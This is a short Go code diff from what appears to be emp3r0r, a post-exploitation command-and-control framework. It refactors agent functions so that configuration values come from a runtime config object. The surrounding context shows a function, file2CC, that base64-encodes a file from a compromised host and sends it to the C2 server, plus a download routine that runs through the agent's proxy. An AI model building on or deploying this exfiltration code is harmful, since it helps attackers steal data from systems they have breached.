@@ -36,8 +36,8 @@ func file2CC(filepath string, offset int64) (checksum string, err error) {
 	payload := base64.StdEncoding.EncodeToString(bytes)
 
 	fileData := emp3r0r_data.MsgTunData{
-		Payload: "FILE" + emp3r0r_data.OpSep + filepath + emp3r0r_data.OpSep + payload,
-		Tag:     emp3r0r_data.AgentTag,
+		Payload: "FILE" + RuntimeConfig.MagicString + filepath + RuntimeConfig.MagicString + payload,
+		Tag:     RuntimeConfig.AgentTag,
 	}
 
 	// send
@@ -56,7 +56,7 @@ func DownloadViaCC(url, path string) (data []byte, err error) {
 
 	// use EmpHTTPClient
 	client := grab.NewClient()
-	client.HTTPClient = tun.EmpHTTPClient(emp3r0r_data.AgentProxy)
+	client.HTTPClient = tun.EmpHTTPClient(RuntimeConfig.AgentProxy)
 
 	req, err := grab.NewRequest(path, url)
 	if err != nil {
